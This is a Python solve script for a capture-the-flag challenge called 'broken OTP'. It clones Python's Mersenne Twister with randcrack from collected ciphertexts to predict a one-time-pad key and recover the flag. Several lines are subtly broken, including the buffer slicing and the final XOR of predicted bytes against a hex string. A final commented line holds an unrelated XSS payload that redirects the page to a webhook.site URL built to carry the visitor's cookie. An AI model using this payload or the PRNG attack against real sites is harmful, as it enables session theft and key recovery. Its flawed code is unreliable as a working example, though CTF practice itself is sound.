import io
import subprocess
import time
from randcrack import RandCrack

rc = RandCrack()

def extract_secret(res):
    return res.split(" ")[-1].strip()





def get_secret(host, port):
    try:
        # Start the sc command with subprocess
        # Establish connection with the server
        process = subprocess.Popen(
            ["sc", f"{host}:{port}"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        # Read the initial welcome message
        welcome_message = process.stdout.readline()
        print(f"Received welcome message:\n{welcome_message}")

        # Send the command to the server
        process.stdin.write('2' + "\n")
        process.stdin.flush()

        # Read the server response
        response = ""
        start_time = time.time()
        while True:
            if process.stdout.readable():
                line = process.stdout.readline()
                if line:
                    response += line
                if time.time() - start_time > 5:  # Adjust timeout as needed
                    break

        secret = extract_secret(response)

        # Close the process
        process.stdin.close()
        process.stdout.close()
        process.stderr.close()
        process.terminate()

        return secret

    except Exception as e:
        print(f"An error occurred: {e}")

def send_secret(plaintext, host, port):
    try:
        # 1.
        # Start the sc command with subprocess
        # Establish connection with the server
        process = subprocess.Popen(
            ["sc", f"{host}:{port}"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        # Read the initial welcome message
        welcome_message = process.stdout.readline()
        print(f"Received welcome message:\n{welcome_message}")



        # 2.
        # Send the command to the server
        process.stdin.write('1' + "\n")
        process.stdin.flush()
        # Read the initial welcome message
        res = process.stdout.readline()
        print(f"Received message:\n{res}")


        # 3.
        # Send text to be encrypted
        process.stdin.write(plaintext + "\n")
        process.stdin.flush()

        # Read the server response
        response = ""
        start_time = time.time()
        while True:
            if process.stdout.readable():
                line = process.stdout.readline()
                if line:
                    response += line
                if time.time() - start_time > 5:  # Adjust timeout as needed
                    break

        secret = extract_secret(response)

        # Close the process
        process.stdin.close()
        process.stdout.close()
        process.stderr.close()
        process.terminate()

        return secret

    except Exception as e:
        print(f"An error occurred: {e}")





def train_rand(buffer, remaining):
    while len(buffer) >= 4 and remaining:
        rc.submit(int.from_bytes(buffer[:4 % remaining], byteorder='big'))
        remaining -= (4 % remaining)
        buffer = buffer[4 % remaining:]
    return buffer






def connect_to_server(host, port):
    req_counter = 0
    count = 2496  # Need to train on that amount of byte
    hexbuffer = ""
    try:
        with open("ciphers.txt", "wb") as f:
            while req_counter <= 132:
                secret = get_secret(host, port)
                f.write(secret.encode())
                hexbuffer += secret
                req_counter += 1
                print(req_counter)

            # Train randCracker
            hexbuffer = hexbuffer[:-24] # Here we need exactly 2496 bytes no less, no more
            tot = bytes.fromhex(hexbuffer) 
            int_arr = [int.from_bytes(tot[i:i+4]) for i in range(0,len(tot),4)] # hex string to array of ints
            print( "len arr", len(int_arr) ) # 624
            for i in int_arr:
                rc.submit(i)

            # Guess the next secret
            k = b''.join([bytes([rc.predict_randrange(0, 255)]) for _ in range(19)])
            e_flag = get_secret(host, port)
            print("Predicted key: ", k)
            print("e_flag:", e_flag)
            flag = [ e ^ k for e, k in zip(k, e_flag.encode())]
            print(flag)

            f.write(flag.encode())
            f.close()

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    host = "nopsctf-broken-otp.chals.io"
    port = "443"
    # Connect to the server and save ciphertexts to file
    secret = connect_to_server(host, port)



#<BODY ONLOAD='window.location=atob("aHR0cHM6Ly93ZWJob29rLnNpdGUvMzc3ZGZhZjctZDhhYS00NmM0LWFkOGEtZmNjZmQ1ZDc0YmIwLz9jb29raWU9").concat(atob("ZG9jdW1lbnQuY29va2ll"))'>